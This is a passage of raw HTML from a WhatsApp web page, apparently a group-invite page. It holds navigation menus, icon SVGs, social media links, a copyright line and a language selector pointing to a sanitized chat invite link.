                                                                <path fill-rule="evenodd" clip-rule="evenodd" d="M16.002 8.50042C16.002 8.0862 15.6662 7.75042 15.252 7.75042L8.7514 7.75042L8.7514 1.25042C8.7514 0.836205 8.41562 0.500418 8.0014 0.500418C7.58719 0.500418 7.2514 0.836205 7.2514 1.25042L7.2514 7.75042L0.752014 7.75042C0.337801 7.75042 0.00201378 8.0862 0.00201363 8.50042C0.00201415 8.91463 0.337801 9.25042 0.752014 9.25042L7.2514 9.25042L7.2514 15.7504C7.2514 16.1646 7.58719 16.5004 8.0014 16.5004C8.41562 16.5004 8.7514 16.1646 8.7514 15.7504L8.7514 9.25042L15.252 9.25042C15.6662 9.25042 16.002 8.91463 16.002 8.50042Z" fill="#currentColor"></path>
                                                            </g>
                                                            <defs>
                                                                <clipPath id="clip0_1842_81860">
                                                                    <rect width="16" height="16" fill="white" transform="translate(0 0.5)"></rect>
                                                                </clipPath>
                                                            </defs>
                                                        </svg><svg fill="currentColor" width="16" height="3" viewBox="0 0 16 3" xmlns="http://www.w3.org/2000/svg" class="_wauiIcon__minus _aedd">
                                                            <path d="M15.2518 0.750113C15.666 0.750113 16.0018 1.0859 16.0018 1.50011C16.0018 1.91433 15.666 2.25011 15.2518 2.25011H0.751831C0.337618 2.25011 0.00183158 1.91433 0.00183105 1.50011C0.0018312 1.0859 0.337617 0.750113 0.751831 0.750113H15.2518Z" fill="currentColor"></path>
                                                        </svg>
                                                        <h3 class="_9vd5 _9sc- _9t31 _9wm8">Features</h3>
                                                    </button>
                                                    <div class="_9wm6" aria-hidden="true" role="tabpanel">
                                                        <div class="_9wn9"><a href="https://www.whatsapp.com/privacy" class="_9vd5 _aens _afod" target="_self" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;NavigationDropdown_MessagePrivately_Mobile_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_afoi"><svg width="16" height="21" viewBox="0 0 16 21" fill="none" xmlns="http://www.w3.org/2000/svg" class="_wauiIcon__privacy _afoj">
                                                                        <path d="M14 7H13V5C13 2.24 10.76 0 8 0C5.24 0 3 2.24 3 5V7H2C0.9 7 0 7.9 0 9V19C0 20.1 0.9 21 2 21H14C15.1 21 16 20.1 16 19V9C16 7.9 15.1 7 14 7ZM8 16C6.9 16 6 15.1 6 14C6 12.9 6.9 12 8 12C9.1 12 10 12.9 10 14C10 15.1 9.1 16 8 16ZM5 7V5C5 3.34 6.34 2 8 2C9.66 2 11 3.34 11 5V7H5Z" fill="currentColor"></path>
                                                                    </svg></span><span><span class="_afog"><span class="_9vg3 _aj1b" style="">Message privately</span></span><svg width="15" height="13" fill="none" class="_wauiIcon__arrow _agnt _aq31 _afok">
                                                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M.31 6.432a.75.75 0 01.75-.75h10.932L8.387 2.076a.75.75 0 011.06-1.06l4.94 4.939a.75.75 0 01-.024 1.083.664.664 0 01-.022.024l-5.247 5.247a.75.75 0 11-1.06-1.061l4.065-4.066H1.061a.75.75 0 01-.75-.75z" fill="currentColor"></path>
                                                                    </svg></span></a><a href="https://www.whatsapp.com/stayconnected" class="_9vd5 _aens _afod" target="_self" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;NavigationDropdown_StayConnected_Mobile_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_afoi"><svg width="20" height="20" fill="none" xmlns="http://www.w3.org/2000/svg" class="_wauiIcon__globe-alt _afoj">
                                                                        <path d="M10 0C4.48 0 0 4.48 0 10s4.48 10 10 10 10-4.48 10-10S15.52 0 10 0ZM9 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L7 13v1c0 1.1.9 2 2 2v1.93Zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H6V8h2c.55 0 1-.45 1-1V5h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39Z" fill="currentColor"></path>
                                                                    </svg></span><span><span class="_afog"><span class="_9vg3 _aj1b" style="">Stay connected</span></span><svg width="15" height="13" fill="none" class="_wauiIcon__arrow _agnt _aq31 _afok">
                                                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M.31 6.432a.75.75 0 01.75-.75h10.932L8.387 2.076a.75.75 0 011.06-1.06l4.94 4.939a.75.75 0 01-.024 1.083.664.664 0 01-.022.024l-5.247 5.247a.75.75 0 11-1.06-1.061l4.065-4.066H1.061a.75.75 0 01-.75-.75z" fill="currentColor"></path>
                                                                    </svg></span></a><a href="https://www.whatsapp.com/groups" class="_9vd5 _aens _afod" target="_self" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;NavigationDropdown_ConnectInGroups_Mobile_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_afoi"><svg width="24" height="13" viewBox="0 0 24 13" fill="none" xmlns="http://www.w3.org/2000/svg" class="_wauiIcon__communities _afoj">
                                                                        <path d="M7.00049 5H5.00049V3C5.00049 2.45 4.55049 2 4.00049 2C3.45049 2 3.00049 2.45 3.00049 3V5H1.00049C0.450488 5 0.000488281 5.45 0.000488281 6C0.000488281 6.55 0.450488 7 1.00049 7H3.00049V9C3.00049 9.55 3.45049 10 4.00049 10C4.55049 10 5.00049 9.55 5.00049 9V7H7.00049C7.55049 7 8.00049 6.55 8.00049 6C8.00049 5.45 7.55049 5 7.00049 5ZM18.0005 6C19.6605 6 20.9905 4.66 20.9905 3C20.9905 1.34 19.6605 0 18.0005 0C17.6805 0 17.3705 0.0499999 17.0905 0.14C17.6605 0.95 17.9905 1.93 17.9905 3C17.9905 4.07 17.6505 5.04 17.0905 5.86C17.3705 5.95 17.6805 6 18.0005 6ZM13.0005 6C14.6605 6 15.9905 4.66 15.9905 3C15.9905 1.34 14.6605 0 13.0005 0C11.3405 0 10.0005 1.34 10.0005 3C10.0005 4.66 11.3405 6 13.0005 6ZM13.0005 8C11.0005 8 7.00049 9 7.00049 11V12C7.00049 12.55 7.45049 13 8.00049 13H18.0005C18.5505 13 19.0005 12.55 19.0005 12V11C19.0005 9 15.0005 8 13.0005 8ZM19.6205 8.16C20.4505 8.89 21.0005 9.82 21.0005 11V12.5C21.0005 12.67 20.9805 12.84 20.9505 13H23.5005C23.7805 13 24.0005 12.78 24.0005 12.5V11C24.0005 9.46 21.6305 8.51 19.6205 8.16Z" fill="currentColor"></path>
                                                                    </svg></span><span><span class="_afog"><span class="_9vg3 _aj1b" style="">Connect in groups</span></span><svg width="15" height="13" fill="none" class="_wauiIcon__arrow _agnt _aq31 _afok">
                                                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M.31 6.432a.75.75 0 01.75-.75h10.932L8.387 2.076a.75.75 0 011.06-1.06l4.94 4.939a.75.75 0 01-.024 1.083.664.664 0 01-.022.024l-5.247 5.247a.75.75 0 11-1.06-1.061l4.065-4.066H1.061a.75.75 0 01-.75-.75z" fill="currentColor"></path>
                                                                    </svg></span></a><a href="https://www.whatsapp.com/expressyourself" class="_9vd5 _aens _afod" target="_self" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;NavigationDropdown_ExpressYourself_Mobile_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_afoi"><svg width="18" height="18" viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg" class="_wauiIcon__smileFace _afoj">
                                                                        <path d="M8.99149 0C4.02349 0 0.000488281 4.032 0.000488281 9C0.000488281 13.968 4.02349 18 8.99149 18C13.9685 18 18.0005 13.968 18.0005 9C18.0005 4.032 13.9685 0 8.99149 0ZM5.85049 5.4C6.59749 5.4 7.20049 6.003 7.20049 6.75C7.20049 7.497 6.59749 8.1 5.85049 8.1C5.10349 8.1 4.50049 7.497 4.50049 6.75C4.50049 6.003 5.10349 5.4 5.85049 5.4ZM13.2395 11.448C12.4205 13.203 10.8365 14.4 9.00049 14.4C7.16449 14.4 5.58049 13.203 4.76149 11.448C4.61749 11.151 4.83349 10.8 5.16649 10.8H12.8345C13.1675 10.8 13.3835 11.151 13.2395 11.448ZM12.1505 8.1C11.4035 8.1 10.8005 7.497 10.8005 6.75C10.8005 6.003 11.4035 5.4 12.1505 5.4C12.8975 5.4 13.5005 6.003 13.5005 6.75C13.5005 7.497 12.8975 8.1 12.1505 8.1Z" fill="currentColor"></path>
                                                                    </svg></span><span><span class="_afog"><span class="_9vg3 _aj1b" style="">Express yourself</span></span><svg width="15" height="13" fill="none" class="_wauiIcon__arrow _agnt _aq31 _afok">
                                                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M.31 6.432a.75.75 0 01.75-.75h10.932L8.387 2.076a.75.75 0 011.06-1.06l4.94 4.939a.75.75 0 01-.024 1.083.664.664 0 01-.022.024l-5.247 5.247a.75.75 0 11-1.06-1.061l4.065-4.066H1.061a.75.75 0 01-.75-.75z" fill="currentColor"></path>
                                                                    </svg></span></a><a href="https://business.whatsapp.com/" class="_9vd5 _aens _afod" target="_self" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;NavigationDropdown_WhatsAppForBusiness_Mobile_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_afoi"><svg width="20" height="18" viewBox="0 0 20 18" fill="none" xmlns="http://www.w3.org/2000/svg" class="_wauiIcon__store _afoj">
                                                                        <path d="M19.8951 5.89L18.8451 1.52C18.6251 0.62 17.8451 0 16.9351 0H14.7251H12.7151H10.9951H8.99512H7.27512H5.25512H3.04512C2.14512 0 1.35512 0.63 1.14512 1.52L0.0951238 5.89C-0.144876 6.91 0.0751239 7.95 0.715124 8.77C0.795124 8.88 0.905124 8.96 0.995124 9.06V16C0.995124 17.1 1.89512 18 2.99512 18H16.9951C18.0951 18 18.9951 17.1 18.9951 16V9.06C19.0851 8.97 19.1951 8.88 19.2751 8.78C19.9151 7.96 20.1451 6.91 19.8951 5.89ZM5.01512 2L4.43512 6.86C4.35512 7.51 3.83512 8 3.22512 8C2.73512 8 2.42512 7.71 2.29512 7.53C2.03512 7.2 1.94512 6.77 2.04512 6.36L3.04512 2H5.01512ZM16.9051 1.99L17.9551 6.36C18.0551 6.78 17.9651 7.2 17.7051 7.53C17.5651 7.71 17.2651 8 16.7651 8C16.1551 8 15.6251 7.51 15.5551 6.86L14.9751 2L16.9051 1.99ZM13.5051 6.52C13.5551 6.91 13.4351 7.3 13.1751 7.59C12.9451 7.85 12.6251 8 12.2151 8C11.5451 8 10.9951 7.41 10.9951 6.69V2H12.9551L13.5051 6.52ZM8.99512 6.69C8.99512 7.41 8.44512 8 7.70512 8C7.36512 8 7.05512 7.85 6.81512 7.59C6.56512 7.3 6.44512 6.91 6.48512 6.52L7.03512 2H8.99512V6.69ZM15.9951 16H3.99512C3.44512 16 2.99512 15.55 2.99512 15V9.97C3.07512 9.98 3.14512 10 3.22512 10C4.09512 10 4.88512 9.64 5.46512 9.05C6.06512 9.65 6.86512 10 7.77512 10C8.64512 10 9.42512 9.64 10.0051 9.07C10.5951 9.64 11.3951 10 12.2951 10C13.1351 10 13.9351 9.65 14.5351 9.05C15.1151 9.64 15.9051 10 16.7751 10C16.8551 10 16.9251 9.98 17.0051 9.97V15C16.9951 15.55 16.5451 16 15.9951 16Z" fill="currentColor"></path>
                                                                    </svg></span><span><span class="_afog"><span class="_9vg3 _aj1b" style="">WhatsApp for business</span></span><svg class="_wauiIcon__go-to-icon _agnt _afok" width="10" height="10" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M1.214.447a.75.75 0 0 0-.005 1.5l5.712.023L.645 8.245a.75.75 0 1 0 1.06 1.06L7.983 3.03l.022 5.713a.75.75 0 1 0 1.5-.006l-.03-7.487a.748.748 0 0 0-.779-.774L1.215.447Z" fill="currentColor"></path>
                                                                    </svg></span></a></div>
                                                    </div>
                                                </li>
                                            </ul>
                                        </div>
                                    </li>
                                    <li class="_9t0h"><a href="https://www.whatsapp.com/privacy" class="_aeo9 _asnw _9vcv _9sep" data-ms="&#123;&quot;creative&quot;:&quot;header&quot;,&quot;creative_detail&quot;:&quot;Navigation_Privacy_Mobile_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam">Privacy</span></a></li>
                                    <li class="_9t0h"><a href="https://faq.whatsapp.com/" class="_aeo9 _asnw _9vcv _9sep" data-ms="&#123;&quot;creative&quot;:&quot;header&quot;,&quot;creative_detail&quot;:&quot;Navigation_HelpCenter_Mobile_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam">Help Center</span></a></li>
                                    <li class="_9t0h"><a href="https://blog.whatsapp.com/" class="_aeo9 _asnw _9vcv _9sep" data-ms="&#123;&quot;creative&quot;:&quot;header&quot;,&quot;creative_detail&quot;:&quot;Navigation_Blog_Mobile_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam">Blog</span></a></li>
                                    <li class="_9t0h"><a href="https://business.whatsapp.com/" class="_aeo9 _asnw _9vcv _9sep" data-ms="&#123;&quot;creative&quot;:&quot;header&quot;,&quot;creative_detail&quot;:&quot;Navigation_ForBusiness_Mobile_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam">For Business</span></a></li>
                                    <li class="_9t0h"><a href="https://whatsapp.com/download" class="_aeo9 _asnw _9vcv _9sep" data-ms="&#123;&quot;creative&quot;:&quot;header&quot;,&quot;creative_detail&quot;:&quot;Navigation_Download_Mobile_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam">Download</span></a></li>
                                </ul>
                                <div class="_ag12">
                                    <div class="_9tar _9ta3 _9ta5 _9ta8 _9tau _ag14">
                                        <div class="_9vd6 _9t33 _9bir _9bj3 _9bhd _9v12 _9tau">
                                            <div class="_ag13">
                                                <div class="_asz5"><a href="https://www.whatsapp.com/download" class="_aeo8 _9vcv _9u4o _a805 _9scc _9scs _9sep" data-ms="&#123;&quot;creative&quot;:&quot;header&quot;,&quot;creative_detail&quot;:&quot;MobileSubnav_Unsupported_Download_Button&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam">Download</span><span><svg width="16" height="16" viewBox="0 0 16 16" fill="none" class="_wauiIcon__download-alternative _agnt _9u4c">
                                                                <path fill-rule="evenodd" clip-rule="evenodd" d="M13.75 13.75C13.75 14.1642 13.4142 14.5 13 14.5L3 14.5C2.58579 14.5 2.25 14.1642 2.25 13.75C2.25 13.3358 2.58579 13 3 13L13 13C13.4142 13 13.75 13.3358 13.75 13.75Z" fill="currentColor"></path>
                                                                <path fill-rule="evenodd" clip-rule="evenodd" d="M8.7487 2C8.7487 1.58579 8.41291 1.25 7.9987 1.25C7.58448 1.25 7.2487 1.58579 7.2487 2L7.2487 9.53955L3.19233 5.51449C2.89831 5.22274 2.42344 5.22458 2.13168 5.5186C1.83993 5.81263 1.84177 6.2875 2.13579 6.57925L7.46912 11.8714C7.76154 12.1616 8.23325 12.1616 8.52567 11.8714L13.859 6.57926C14.153 6.2875 14.1549 5.81263 13.8631 5.5186C13.5714 5.22458 13.0965 5.22274 12.8025 5.51449L8.7487 9.53697L8.7487 2Z" fill="currentColor"></path>
                                                            </svg></span></a></div>
                                            </div>
                                        </div>
                                        <div class="_9vd6 _9t33 _9bir _9bj3 _9bhd _9v12 _9tau">
                                            <div class="_ag1m"><a aria-label="x link" href="https://x.com/whatsapp" class="_afwh _adig _ao_2 _ad_c" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Navigation_Twitter_Mobile_Button&quot;&#125;" target="_blank" data-lnfb-mode="ie" style="background-color:;border-color:;fill:;stroke:;"><svg viewBox="0 0 1200 1227" width="48" height="48" fill="none" xmlns="http://www.w3.org/2000/svg" class="_aghm _adid _arcp _afbl">
                                                        <path d="M714.163 519.284L1160.89 0H1055.03L667.137 450.887L357.328 0H0L468.492 681.821L0 1226.37H105.866L515.491 750.218L842.672 1226.37H1200L714.137 519.284H714.163ZM569.165 687.828L521.697 619.934L144.011 79.6944H306.615L611.412 515.685L658.88 583.579L1055.08 1150.3H892.476L569.165 687.854V687.828Z" fill="currentColor"></path>
                                                    </svg></a><a aria-label="youtube link" href="https://www.youtube.com/channel/UCAuerig2N-RZWJT8x75V9yw" class="_afwh _adig _ao_2 _ad_c" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Navigation_YouTube_Mobile_Button&quot;&#125;" target="_blank" data-lnfb-mode="ie" style="background-color:;border-color:;fill:;stroke:;"><svg width="23" height="16" viewBox="0 0 23 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="_wauiIcon__youtube _adid _arcp _afbl">
                                                        <path d="M22.0088 5.95168C22.0583 4.52034 21.7452 3.0997 21.0988 1.82168C20.6602 1.29728 20.0515 0.943393 19.3788 0.821683C16.5963 0.569209 13.8023 0.465727 11.0088 0.511683C8.22546 0.463642 5.44152 0.563783 2.66882 0.811683C2.12064 0.9114 1.61333 1.16853 1.20882 1.55168C0.308816 2.38168 0.208816 3.80168 0.108816 5.00168C-0.036272 7.15925 -0.036272 9.32412 0.108816 11.4817C0.137746 12.1571 0.23831 12.8275 0.408816 13.4817C0.529391 13.9867 0.773339 14.454 1.11882 14.8417C1.52608 15.2451 2.0452 15.5169 2.60882 15.6217C4.76473 15.8878 6.93703 15.9981 9.10882 15.9517C12.6088 16.0017 15.6788 15.9517 19.3088 15.6717C19.8863 15.5733 20.42 15.3012 20.8388 14.8917C21.1188 14.6116 21.3279 14.2688 21.4488 13.8917C21.8064 12.7943 21.9821 11.6458 21.9688 10.4917C22.0088 9.93168 22.0088 6.55168 22.0088 5.95168ZM8.74882 11.0917V4.90168L14.6688 8.01168C13.0088 8.93168 10.8188 9.97168 8.74882 11.0917Z" fill="currentColor"></path>
                                                    </svg></a><a aria-label="Instagram link" href="https://www.instagram.com/whatsapp/?hl=en" class="_afwh _adig _ao_2 _ad_c" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Navigation_Instagram_Mobile_Button&quot;&#125;" target="_blank" data-lnfb-mode="ie" style="background-color:;border-color:;fill:;stroke:;"><svg width="20" height="21" viewBox="0 0 20 21" fill="none" xmlns="http://www.w3.org/2000/svg" class="_wauiIcon__instagram _adid _arcp _afbl">
                                                        <path d="M15.34 3.96C15.1027 3.96 14.8707 4.03038 14.6733 4.16224C14.476 4.29409 14.3222 4.48151 14.2313 4.70078C14.1405 4.92005 14.1168 5.16133 14.1631 5.39411C14.2094 5.62689 14.3236 5.84071 14.4915 6.00853C14.6593 6.17635 14.8731 6.29064 15.1059 6.33694C15.3387 6.38324 15.5799 6.35948 15.7992 6.26866C16.0185 6.17783 16.2059 6.02402 16.3378 5.82668C16.4696 5.62935 16.54 5.39734 16.54 5.16C16.54 4.84174 16.4136 4.53652 16.1885 4.31147C15.9635 4.08643 15.6583 3.96 15.34 3.96ZM19.94 6.38C19.9206 5.5503 19.7652 4.7294 19.48 3.95C19.2257 3.28313 18.83 2.67928 18.32 2.18C17.8248 1.66743 17.2196 1.27418 16.55 1.03C15.7727 0.736161 14.9508 0.57721 14.12 0.56C13.06 0.5 12.72 0.5 10 0.5C7.28 0.5 6.94 0.5 5.88 0.56C5.04915 0.57721 4.22734 0.736161 3.45 1.03C2.78168 1.27665 2.17693 1.66956 1.68 2.18C1.16743 2.67518 0.774176 3.28044 0.53 3.95C0.236161 4.72734 0.07721 5.54915 0.0599999 6.38C-5.58794e-08 7.44 0 7.78 0 10.5C0 13.22 -5.58794e-08 13.56 0.0599999 14.62C0.07721 15.4508 0.236161 16.2727 0.53 17.05C0.774176 17.7196 1.16743 18.3248 1.68 18.82C2.17693 19.3304 2.78168 19.7234 3.45 19.97C4.22734 20.2638 5.04915 20.4228 5.88 20.44C6.94 20.5 7.28 20.5 10 20.5C12.72 20.5 13.06 20.5 14.12 20.44C14.9508 20.4228 15.7727 20.2638 16.55 19.97C17.2196 19.7258 17.8248 19.3326 18.32 18.82C18.8322 18.3226 19.2283 17.7182 19.48 17.05C19.7652 16.2706 19.9206 15.4497 19.94 14.62C19.94 13.56 20 13.22 20 10.5C20 7.78 20 7.44 19.94 6.38ZM18.14 14.5C18.1327 15.1348 18.0178 15.7637 17.8 16.36C17.6403 16.7952 17.3839 17.1884 17.05 17.51C16.7256 17.8405 16.3332 18.0964 15.9 18.26C15.3037 18.4778 14.6748 18.5927 14.04 18.6C13.04 18.65 12.67 18.66 10.04 18.66C7.41 18.66 7.04 18.66 6.04 18.6C5.38089 18.6123 4.72459 18.5109 4.1 18.3C3.68578 18.1281 3.31136 17.8728 3 17.55C2.66809 17.2287 2.41484 16.8352 2.26 16.4C2.01586 15.7952 1.88044 15.1519 1.86 14.5C1.86 13.5 1.8 13.13 1.8 10.5C1.8 7.87 1.8 7.5 1.86 6.5C1.86448 5.85106 1.98295 5.20795 2.21 4.6C2.38605 4.17791 2.65627 3.80166 3 3.5C3.30381 3.15617 3.67929 2.8831 4.1 2.7C4.70955 2.48004 5.352 2.36508 6 2.36C7 2.36 7.37 2.3 10 2.3C12.63 2.3 13 2.3 14 2.36C14.6348 2.36728 15.2637 2.48225 15.86 2.7C16.3144 2.86865 16.7223 3.14285 17.05 3.5C17.3777 3.80718 17.6338 4.18273 17.8 4.6C18.0223 5.20893 18.1373 5.85178 18.14 6.5C18.19 7.5 18.2 7.87 18.2 10.5C18.2 13.13 18.19 13.5 18.14 14.5ZM10 5.37C8.98581 5.37198 7.99496 5.67453 7.15265 6.23942C6.31035 6.80431 5.65438 7.6062 5.26763 8.54375C4.88089 9.48131 4.78072 10.5125 4.97979 11.5069C5.17886 12.5014 5.66824 13.4145 6.38608 14.131C7.10392 14.8474 8.01801 15.335 9.01286 15.5321C10.0077 15.7293 11.0387 15.6271 11.9755 15.2385C12.9123 14.85 13.7129 14.1924 14.2761 13.349C14.8394 12.5056 15.14 11.5142 15.14 10.5C15.1413 9.8251 15.0092 9.15661 14.7512 8.53296C14.4933 7.90931 14.1146 7.34281 13.6369 6.86605C13.1592 6.38929 12.5919 6.01168 11.9678 5.75493C11.3436 5.49818 10.6749 5.36736 10 5.37ZM10 13.83C9.34139 13.83 8.69757 13.6347 8.14995 13.2688C7.60234 12.9029 7.17552 12.3828 6.92348 11.7743C6.67144 11.1659 6.6055 10.4963 6.73398 9.85035C6.86247 9.20439 7.17963 8.61104 7.64533 8.14533C8.11104 7.67963 8.70439 7.36247 9.35035 7.23398C9.99631 7.1055 10.6659 7.17144 11.2743 7.42348C11.8828 7.67552 12.4029 8.10234 12.7688 8.64995C13.1347 9.19757 13.33 9.84139 13.33 10.5C13.33 10.9373 13.2439 11.3703 13.0765 11.7743C12.9092 12.1784 12.6639 12.5454 12.3547 12.8547C12.0454 13.1639 11.6784 13.4092 11.2743 13.5765C10.8703 13.7439 10.4373 13.83 10 13.83Z" fill="currentColor"></path>
                                                    </svg></a><a aria-label="facebook link" href="https://www.facebook.com/profile.php?id=100064758844406" class="_afwh _adig _ao_2 _ad_c" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Navigation_Facebook_Mobile_Button&quot;&#125;" target="_blank" style="background-color:;border-color:;fill:;stroke:;"><svg width="11" height="21" viewBox="0 0 11 21" fill="none" xmlns="http://www.w3.org/2000/svg" class="_wauiIcon__facebook-alt _adid _arcp _afbl">
                                                        <path d="M8.51 3.82003H10.39V0.64003C9.47975 0.545377 8.56516 0.498646 7.65 0.50003C4.93 0.50003 3.07 2.16003 3.07 5.20003V7.82003H0V11.38H3.07V20.5H6.75V11.38H9.81L10.27 7.82003H6.75V5.55003C6.75 4.50003 7.03 3.82003 8.51 3.82003Z" fill="currentColor"></path>
                                                    </svg></a></div>
                                        </div>
                                    </div>
                                    <div class="_9tar _9ta3 _9ta5 _9ta7 _9tau _ag1n">
                                        <div class="_9vd6 _9t33 _9bir _9biz _9bhj _9v12 _9taw">
                                            <div class="_ag1o"><a href="https://www.whatsapp.com/legal/" target="_blank" class="_aeo9 _asnw _9vcv _9sep" data-ms="&#123;&quot;creative&quot;:&quot;header&quot;,&quot;creative_detail&quot;:&quot;Navigation_TermsAndPrivacyPolicy_Mobile_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam">Terms &amp; Privacy Policy</span></a>2025 © WhatsApp LLC</div>
                                        </div>
                                        <div class="_9vd6 _9t33 _9bir _9biz _9bhj _9ta9">
                                            <div class="_9tjq">
                                                <div class="_afoa"><select id="u_0_6_td" class="_9tg0 _afo4 _afon _aqya" aria-label="Select your preferred language" role="listbox" tabindex="0">
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=az">Azərbaycan</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=af">Afrikaans</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=id">Bahasa Indonesia</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ms">Melayu</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ca">Català</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=cs">čeština</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=da">Dansk</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=de">Deutsch</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=et">Eesti</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=en" selected="1">English</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=es">Español</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=fr">Français</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ga">Gaeilge</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=hr">Hrvatski</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=it">Italiano</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sw">Kiswahili</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=lv">Latviešu</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=lt">Lietuvių</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=hu">Magyar</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=nl">Nederlands</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=nb">Norsk bokmål</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=uz">O‘zbek</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=tl">Filipino</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pl">Polski</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pt_br">Português (Brasil)</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pt_pt">Português (Portugal)</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ro">Română</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sq">Shqip</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sk">Slovenčina</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sl">Slovenščina</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=fi">Suomi</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sv">Svenska</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=vi">Tiếng Việt</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=tr">Türkçe</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=el">Ελληνικά</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=bg">български</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=kk">қазақ тілі</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=mk">македонски</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ru">русский</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sr">српски</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=uk">українська</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=he">עברית</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ar">العربية</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=fa">فارسی</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ur">اردو</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=bn">বাংলা</option>
                                                        <option class="_afo9" value="https://chat.whatsapp.com/--sanitized-S228802--?lang=hi">हिन्दी</option>
